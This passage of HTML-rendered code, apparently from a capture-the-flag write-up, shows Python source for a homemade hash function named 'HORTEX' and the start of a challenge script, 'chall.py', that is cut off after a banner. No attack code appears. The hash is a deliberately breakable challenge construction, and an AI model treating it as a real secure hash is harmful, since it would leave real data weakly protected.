+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">math</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">biner_ke_hex</span><span class="p">(</span><span class="n">biner</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">desimal</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">biner</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">heksadesimal</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">desimal</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">heksadesimal</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">float_bin</span><span class="p">(</span><span class="n">my_number</span><span class="p">,</span> <span class="n">places</span><span class="o">=</span><span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">my_whole</span><span class="p">,</span> <span class="n">my_dec</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">my_number</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">my_whole</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">my_whole</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">res</span> <span class="o">=</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="n">my_whole</span><span class="p">))</span><span class="o">+</span><span class="s2">&#34;.&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0b&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">places</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">      <span class="n">my_dec</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="s1">&#39;0.&#39;</span><span class="p">)</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">my_dec</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="n">temp</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%1.20f</span><span class="s1">&#39;</span> <span class="o">%</span><span class="p">(</span><span class="nb">float</span><span class="p">(</span><span class="n">my_dec</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="n">my_whole</span><span class="p">,</span> <span class="n">my_dec</span> <span class="o">=</span> <span class="n">temp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="n">res</span> <span class="o">+=</span> <span class="n">my_whole</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">res</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">cyclic_left_shift</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">shift</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">((</span><span class="n">value</span> <span class="o">&lt;&lt;</span> <span class="n">shift</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">value</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">shift</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">binary32</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">sign</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="n">sign</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">      <span class="n">n</span> <span class="o">=</span> <span class="n">n</span> <span class="o">*</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">p</span> <span class="o">=</span> <span class="mi">30</span>
+</span></span><span class="line"><span class="cl">  <span class="n">dec</span> <span class="o">=</span> <span class="n">float_bin</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">places</span><span class="o">=</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">dotPlace</span> <span class="o">=</span> <span class="n">dec</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">onePlace</span> <span class="o">=</span> <span class="n">dec</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">onePlace</span> <span class="o">&gt;</span> <span class="n">dotPlace</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="n">dec</span> <span class="o">=</span> <span class="n">dec</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="n">onePlace</span> <span class="o">-=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">      <span class="n">dotPlace</span> <span class="o">-=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">  <span class="k">elif</span> <span class="n">onePlace</span> <span class="o">&lt;</span> <span class="n">dotPlace</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="n">dec</span> <span class="o">=</span> <span class="n">dec</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="n">dotPlace</span> <span class="o">-=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">  <span class="n">mantissa</span> <span class="o">=</span> <span class="n">dec</span><span class="p">[</span><span class="n">onePlace</span><span class="o">+</span><span class="mi">1</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">exponent</span> <span class="o">=</span> <span class="n">dotPlace</span> <span class="o">-</span> <span class="n">onePlace</span>
+</span></span><span class="line"><span class="cl">  <span class="n">exponent_bits</span> <span class="o">=</span> <span class="n">exponent</span> <span class="o">+</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="cl">  <span class="n">exponent_bits</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">exponent_bits</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;0b&#34;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">mantissa</span> <span class="o">=</span> <span class="n">mantissa</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">23</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">final</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">sign</span><span class="p">)</span> <span class="o">+</span> <span class="n">exponent_bits</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">mantissa</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">final</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_input</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;Input harus 32-bit string&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">xl</span> <span class="o">=</span> <span class="n">x</span><span class="p">[:</span><span class="mi">12</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="n">xm</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="mi">12</span><span class="p">:</span><span class="mi">28</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="n">xr</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="mi">28</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">xl</span><span class="p">,</span> <span class="n">xm</span><span class="p">,</span> <span class="n">xr</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">calculate_parameters</span><span class="p">(</span><span class="n">xl</span><span class="p">,</span> <span class="n">xm</span><span class="p">,</span> <span class="n">xr</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">gama_awal</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">xl</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="o">/</span> <span class="mi">2</span><span class="o">**</span><span class="mi">12</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">eta</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">xm</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="mi">2</span> <span class="o">/</span> <span class="mi">2</span><span class="o">**</span><span class="mi">16</span><span class="p">))</span> <span class="o">+</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">  <span class="n">k</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">xr</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="o">/</span> <span class="mi">2</span><span class="o">**</span><span class="mi">4</span><span class="p">))</span> <span class="o">+</span> <span class="mf">10.01</span>
+</span></span><span class="line"><span class="cl">  <span class="n">n</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="mi">6</span> <span class="o">*</span> <span class="n">gama_awal</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">gama_awal</span><span class="p">,</span> <span class="n">eta</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">n</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fL</span><span class="p">(</span><span class="n">eta</span><span class="p">,</span> <span class="n">gama_n</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">eta</span> <span class="o">*</span> <span class="n">gama_n</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">gama_n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">gamma_function</span><span class="p">(</span><span class="n">gama_awal</span><span class="p">,</span> <span class="n">eta</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">i</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">gama</span> <span class="o">=</span> <span class="n">gama_awal</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="n">i</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">      <span class="n">gama</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="n">k</span> <span class="o">/</span> <span class="mi">2</span><span class="o">**</span><span class="n">fL</span><span class="p">(</span><span class="n">eta</span><span class="p">,</span> <span class="n">gama</span><span class="p">))</span> <span class="o">%</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">gama</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ELM</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">xl</span><span class="p">,</span> <span class="n">xm</span><span class="p">,</span> <span class="n">xr</span> <span class="o">=</span> <span class="n">parse_input</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">gama_awal</span><span class="p">,</span> <span class="n">eta</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">n</span> <span class="o">=</span> <span class="n">calculate_parameters</span><span class="p">(</span><span class="n">xl</span><span class="p">,</span> <span class="n">xm</span><span class="p">,</span> <span class="n">xr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">gama_n1</span> <span class="o">=</span> <span class="n">gamma_function</span><span class="p">(</span><span class="n">gama_awal</span><span class="p">,</span> <span class="n">eta</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">gama_n2</span> <span class="o">=</span> <span class="n">gamma_function</span><span class="p">(</span><span class="n">gama_awal</span><span class="p">,</span> <span class="n">eta</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">w1</span> <span class="o">=</span> <span class="n">binary32</span><span class="p">(</span><span class="n">gama_n1</span> <span class="o">*</span> <span class="p">(</span><span class="mi">10</span><span class="o">**</span><span class="p">(</span><span class="mi">10</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">  <span class="n">w2</span> <span class="o">=</span> <span class="n">binary32</span><span class="p">(</span><span class="n">gama_n2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">y</span> <span class="o">=</span> <span class="p">(</span><span class="n">cyclic_left_shift</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">w1</span><span class="p">,</span><span class="mi">2</span><span class="p">),</span> <span class="mi">17</span><span class="p">))</span> <span class="o">^</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">w2</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nb">format</span><span class="p">(</span><span class="n">y</span><span class="p">,</span> <span class="s1">&#39;032b&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">transform_f</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">blocks</span> <span class="o">=</span> <span class="p">[</span><span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">32</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="mi">32</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">x_prev</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="o">*</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">      <span class="n">x_curr</span> <span class="o">=</span> <span class="n">blocks</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">      <span class="n">blocks</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">ELM</span><span class="p">(</span><span class="nb">format</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">x_curr</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">^</span> <span class="nb">int</span><span class="p">(</span><span class="n">x_prev</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span><span class="s1">&#39;032b&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">      <span class="n">x_prev</span> <span class="o">=</span> <span class="n">blocks</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">blocks</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">format</span><span class="p">((</span><span class="n">cyclic_left_shift</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">2</span><span class="p">),</span> <span class="mi">19</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">cyclic_left_shift</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">2</span><span class="p">),</span> <span class="mi">9</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">32</span><span class="p">))),</span> <span class="s1">&#39;032b&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">blocks</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">format</span><span class="p">(</span><span class="n">cyclic_left_shift</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span> <span class="o">^</span> <span class="n">cyclic_left_shift</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">2</span><span class="p">),</span> <span class="mi">9</span><span class="p">),</span> <span class="mi">7</span><span class="p">),</span> <span class="s1">&#39;032b&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">blocks</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="nb">format</span><span class="p">(</span><span class="n">cyclic_left_shift</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span> <span class="o">^</span> <span class="n">cyclic_left_shift</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">2</span><span class="p">),</span> <span class="mi">17</span><span class="p">),</span> <span class="mi">13</span><span class="p">),</span> <span class="s1">&#39;032b&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">blocks</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="nb">format</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="mi">2</span><span class="p">))</span> <span class="o">%</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">32</span><span class="p">),</span> <span class="s1">&#39;032b&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">blocks</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="nb">format</span><span class="p">(</span><span class="n">cyclic_left_shift</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span> <span class="mi">2</span><span class="p">),</span> <span class="mi">11</span><span class="p">)</span> <span class="o">^</span> <span class="nb">int</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="mi">2</span><span class="p">),</span> <span class="s1">&#39;032b&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">blocks</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">format</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="mi">2</span><span class="p">),</span> <span class="s1">&#39;032b&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">blocks</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nb">format</span><span class="p">(</span><span class="n">cyclic_left_shift</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">2</span><span class="p">),</span> <span class="mi">9</span><span class="p">)</span> <span class="o">^</span> <span class="nb">int</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="mi">2</span><span class="p">),</span> <span class="s1">&#39;032b&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">blocks</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nb">format</span><span class="p">((</span><span class="n">cyclic_left_shift</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">2</span><span class="p">),</span> <span class="mi">17</span><span class="p">)</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">2</span><span class="p">))</span> <span class="o">%</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">32</span><span class="p">),</span> <span class="s1">&#39;032b&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">blocks</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">convert_to_32bit_hex</span><span class="p">(</span><span class="n">input_hex</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">input_int</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">input_hex</span><span class="p">[:</span><span class="mi">8</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>  <span class="c1"># Ambil 8 digit pertama jika lebih panjang dari 8 digit</span>
+</span></span><span class="line"><span class="cl">  <span class="n">bit_string</span> <span class="o">=</span> <span class="nb">format</span><span class="p">(</span><span class="n">input_int</span><span class="p">,</span> <span class="s1">&#39;032b&#39;</span><span class="p">)</span>  <span class="c1"># Konversi integer ke 32 bit biner dengan leading zeros</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">bit_string</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Fungsi hash HORTEX</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">HORTEX</span><span class="p">(</span><span class="n">input_hex</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">X_bin</span> <span class="o">=</span> <span class="n">convert_to_32bit_hex</span><span class="p">(</span><span class="n">input_hex</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">pad_len</span> <span class="o">=</span> <span class="p">(</span><span class="mi">64</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">X_bin</span><span class="p">)</span> <span class="o">%</span> <span class="mi">64</span><span class="p">))</span> <span class="o">%</span> <span class="mi">64</span>
+</span></span><span class="line"><span class="cl">  <span class="n">X_padded</span> <span class="o">=</span> <span class="n">X_bin</span> <span class="o">+</span> <span class="s1">&#39;1&#39;</span> <span class="o">+</span> <span class="s1">&#39;0&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">pad_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">r</span><span class="p">,</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">192</span>
+</span></span><span class="line"><span class="cl">  <span class="n">state</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">r</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">state_int</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">state</span><span class="p">[:</span><span class="n">r</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">block_int</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">X_padded</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">updated_state</span> <span class="o">=</span> <span class="nb">format</span><span class="p">(</span><span class="n">state_int</span> <span class="o">^</span> <span class="n">block_int</span><span class="p">,</span> <span class="s1">&#39;064b&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;0&#39;</span><span class="o">*</span><span class="n">c</span>
+</span></span><span class="line"><span class="cl">  <span class="n">after_abs</span> <span class="o">=</span> <span class="n">transform_f</span><span class="p">(</span><span class="n">updated_state</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">s0</span> <span class="o">=</span> <span class="n">transform_f</span><span class="p">(</span><span class="n">after_abs</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">h1</span> <span class="o">=</span> <span class="n">s0</span><span class="p">[:</span><span class="n">r</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="n">state</span> <span class="o">=</span> <span class="n">transform_f</span><span class="p">(</span><span class="n">s0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">h2</span> <span class="o">=</span> <span class="n">state</span><span class="p">[:</span><span class="n">r</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">h1_hex</span> <span class="o">=</span> <span class="nb">format</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">h1</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="s1">&#39;016x&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">h2_hex</span> <span class="o">=</span> <span class="nb">format</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">h2</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="s1">&#39;016x&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">h1_hex</span> <span class="o">+</span> <span class="n">h2_hex</span></span></span></code></pre></div></div>
+<p><code>chall.py</code></p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">propietary</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">print_diagram</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">  <span class="n">diagram</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  Sistem Penjodohan oleh Mak Comblang. Semoga cocok :)
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
